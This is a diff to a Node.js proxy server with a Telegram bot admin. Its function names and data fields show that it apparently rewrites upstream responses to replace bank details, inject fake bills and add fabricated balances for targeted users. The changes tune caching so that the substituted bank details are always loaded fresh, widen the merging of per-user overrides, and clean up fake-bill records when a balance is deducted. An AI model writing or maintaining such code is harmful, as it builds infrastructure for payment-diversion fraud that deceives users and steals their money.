@@ -36,7 +36,7 @@ if (REDIS_URL && REDIS_TOKEN) {
 
 let cachedData = null;
 let cacheTime = 0;
-const CACHE_TTL = 30000;
+const CACHE_TTL = 5000;
 const tokenUserMap = {};
 const userPhoneMap = {};
 let debugNextResponse = false;
@@ -124,11 +124,10 @@ async function saveData(data) {
             if (!loc) {
               data.userOverrides[uid] = cur;
             } else {
-              if (cur.addedBalance !== undefined && loc.addedBalance === undefined) {
-                loc.addedBalance = cur.addedBalance;
-              }
-              if (cur.quotaRecords && cur.quotaRecords.length > 0 && (!loc.quotaRecords || loc.quotaRecords.length === 0)) {
-                loc.quotaRecords = cur.quotaRecords;
+              for (const key of Object.keys(cur)) {
+                if (loc[key] === undefined) {
+                  loc[key] = cur[key];
+                }
               }
             }
           }
@@ -982,7 +981,12 @@ Example:
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked2 && tracked2.phone) || ''
       });
-      if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
+      if (data.userOverrides[targetUserId].addedBalance <= 0) {
+        delete data.userOverrides[targetUserId].addedBalance;
+        if (data.fakeBills && data.fakeBills[targetUserId]) {
+          delete data.fakeBills[targetUserId];
+        }
+      }
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
@@ -995,6 +999,9 @@ Example:
       if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
         const removed = data.userOverrides[targetId].addedBalance;
         delete data.userOverrides[targetId].addedBalance;
+        if (data.fakeBills && data.fakeBills[targetId]) {
+          delete data.fakeBills[targetId];
+        }
         if (!data.balanceHistory) data.balanceHistory = [];
         const tracked = data.trackedUsers && data.trackedUsers[targetId];
         data.balanceHistory.push({
@@ -1270,7 +1277,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 
   try {
     const [data, proxyResult] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
+      loadData(),
       proxyFetch(req)
     ]);
 
@@ -1479,7 +1486,7 @@ async function proxyAndInjectFakeBills(req, res) {
 async function proxyAndReplaceBankInActiveOrders(req, res) {
   try {
     const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
+      loadData(),
       proxyFetch(req)
     ]);
     const detectedUserId = await extractUserId(req, jsonResp);
